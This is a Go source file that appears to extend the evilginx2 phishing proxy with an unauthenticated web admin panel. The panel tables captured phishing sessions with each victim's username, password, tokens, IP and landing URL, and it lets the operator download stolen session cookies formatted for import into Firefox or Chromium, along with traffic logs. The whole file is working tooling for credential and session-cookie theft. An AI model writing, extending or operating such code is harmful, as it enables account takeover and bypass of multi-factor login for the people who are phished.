package core

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type AdminPanel struct {
	srv *http.Server
	cfg *Config
	db  *database.Database
}

func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
	log.Debug("Starting handleSessions")

	var body string
	var cookiedownloadlinks string

	//terminal.go 339

	cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "landing url", "time", "Download Cookie"}
	sessions, err := a.db.ListSessions()
	if err != nil {
		panic(err)
	}
	if len(sessions) == 0 {
		body = "No saved Sessions found"
	} else {
		var rows [][]string
		for _, s := range sessions {
			tcol := "none"
			if len(s.Tokens) > 0 {
				tcol = "captured"
			}
			cookiedownloadlinks = "<a href='./sessions/download/" + strconv.Itoa(s.Id) + "/Ff'>Ff</a>; <a href='./sessions/download/" + strconv.Itoa(s.Id) + "/Chromium'>Chromium</a>"
			row := []string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, tcol, s.RemoteAddr, s.LandingURL, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"), cookiedownloadlinks}
			rows = append(rows, row)
		}

		body = AsHTMLTable(cols, rows)
	}

	b, _ := ioutil.ReadFile("./templates/adminpanel_basic.html")
	html := fmt.Sprintf(string(b), "Sessions", body)

	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/html")
	w.Write([]byte(html))
}

func (a *AdminPanel) downloadSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, _ := strconv.Atoi(vars["id"])
	browser := vars["browser"]

	log.Debug("Admin Panel Request to download Session %d", id)

	//taken from terminal, because GetSessionBySid does not work??
	sessions, err := a.db.ListSessions()
	var session *database.Session
	if err != nil {
		log.Fatal("%v", err)
	}
	s_found := false
	if len(sessions) == 0 {
		log.Fatal("no saved sessions found")
		s_found = false
	} else {
		for _, s := range sessions {
			if s.Id == id {
				s_found = true
				session = s
				break
			}
		}
	}

	var body string
	if s_found {
		body = tokensToCookie(session.Tokens, browser)

		w.WriteHeader(http.StatusOK)
		w.Header().Set("content-type", "application/json")
		w.Header().Set("Content-Disposition", "attachment; filename='cookie.json'")
		w.Write([]byte(body))
	} else {
		w.WriteHeader(http.StatusNotFound)
		w.Header().Set("content-type", "text/plain")
		w.Write([]byte("Session not found"))
	}
}

func (a *AdminPanel) handleLogs(w http.ResponseWriter, r *http.Request) {
	log.Debug("Starting handleLogs")

	var body string
	var logdownloadlink string

	//terminal.go 339

	if len(a.cfg.trafficloggers) == 0 {
		body = "No saved Sessions found"
	} else {
		cols := []string{"id", "enabled", "type", "filename", "delimiter", "no of Entries", "filesize", "downloadlink"}
		var rows [][]string
		for i, l := range a.cfg.trafficloggers {
			logdownloadlink = "<a href='./logs/download/" + strconv.Itoa(i) + "'>Download</a>"
			rows = append(rows, []string{strconv.Itoa(i), strconv.FormatBool(l.Enabled), l.Type, l.Filename, string(l.Delimiter), strconv.Itoa(l.getEntrysize()), HumanFileSize(l.getFilesize()), logdownloadlink})
		}

		body = AsHTMLTable(cols, rows)
	}

	b, _ := ioutil.ReadFile("./templates/adminpanel_basic.html")
	html := fmt.Sprintf(string(b), "Loggers", body)

	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/html")
	w.Write([]byte(html))
}

func (a *AdminPanel) downloadLog(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, _ := strconv.Atoi(vars["id"])

	log.Debug("Admin Panel Request to download Log %d", id)

	trafficlogger := a.cfg.trafficloggers[id]
	if trafficlogger == nil {
		w.WriteHeader(http.StatusNotFound)
		w.Header().Set("content-type", "text/plain")
		w.Write([]byte("Session not found"))
		return
	}

	filename := trafficlogger.Filename

	content, err := ioutil.ReadFile("/app/log/" + filename)
	if err != nil {
		log.Error("downloadLog() error in ioutil.ReadFile: %s", err)
		w.WriteHeader(http.StatusInternalServerError)
		w.Header().Set("content-type", "text/plain")
		w.Write([]byte("Internal Error when opening file, plase look at system log"))
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/csv")
	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	w.Write(content)
}

func (a *AdminPanel) handleStatus(w http.ResponseWriter, r *http.Request) {
	log.Debug("Starting handleStatus")

	body := getStatus()
	body = strings.Replace(body, "\n", "<br>", -1)

	b, _ := ioutil.ReadFile("./templates/adminpanel_basic.html")
	html := fmt.Sprintf(string(b), "Status", body)

	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/html")
	w.Write([]byte(html))
}

func NewAdminPanel(cfg *Config, db *database.Database) (*AdminPanel, error) {
	a := &AdminPanel{}

	a.cfg = cfg
	a.db = db

	r := mux.NewRouter()
	a.srv = &http.Server{
		Handler:      r,
		Addr:         ":8080",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	// add new endpoints for the admin panel here:
	r.Handle("/", http.RedirectHandler("./index", 302))
	r.HandleFunc("/index", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "./templates/adminpanel_index.html") // serve static index.html
		// the relative path here seems wrong, but it is in relation to the binary later, not the current folderstructure!
	})
	r.HandleFunc("/stlye.css", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "./templates/stlye.css") // serve static css
	})
	r.HandleFunc("/sessions", a.handleSessions)
	r.HandleFunc("/sessions/download/{id}/{browser}", a.downloadSession) //possible options for browser are "Ff" or "Chromium"
	r.HandleFunc("/logs", a.handleLogs)
	r.HandleFunc("/logs/download/{id}", a.downloadLog)
	r.HandleFunc("/status", a.handleStatus)

	return a, nil
}

func (a *AdminPanel) Start() {
	go a.srv.ListenAndServe()
}
